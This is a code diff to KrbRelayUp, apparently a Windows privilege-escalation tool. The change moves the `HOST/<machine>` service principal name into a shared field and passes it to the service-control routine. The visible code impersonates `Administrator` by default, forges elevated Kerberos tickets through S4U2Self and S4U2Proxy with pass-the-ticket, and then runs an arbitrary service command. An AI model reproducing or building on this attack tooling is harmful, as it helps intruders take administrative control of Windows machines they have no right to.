@@ -29,6 +29,7 @@ namespace KrbRelayUp
         public static string impersonateUser = "Administrator";
         public static string serviceName = "KrbSCM";
         public static string serviceCommand = null;
+        public static string targetSPN = $"HOST/{Environment.MachineName.ToUpper()}";
 
         public static void GetHelp()
         {
@@ -103,7 +104,7 @@ namespace KrbRelayUp
 
             if (args[0].ToLower() == "krbscm")
             {
-                KrbSCM.Run(serviceName, serviceCommand);
+                KrbSCM.Run(targetSPN, serviceName, serviceCommand);
                 Environment.Exit(0);
             }
 
@@ -211,14 +212,12 @@ namespace KrbRelayUp
                     impersonateUser = args[iImpersonate + 1];
                 }
 
-                string targetSPN = $"HOST/{Environment.MachineName.ToUpper()}";
-
                 KRB_CRED elevateTicket = S4U.S4U2Self(TGT, impersonateUser, targetSPN, outfile: null, ptt: true);
                 S4U.S4U2Proxy(TGT, impersonateUser, targetSPN, outfile: null, ptt: true, tgs: elevateTicket);
 
                 System.Threading.Thread.Sleep(1500);
 
-                KrbSCM.Run(serviceName, serviceCommand);
+                KrbSCM.Run(targetSPN, serviceName, serviceCommand);
                 Environment.Exit(0);
             }
 
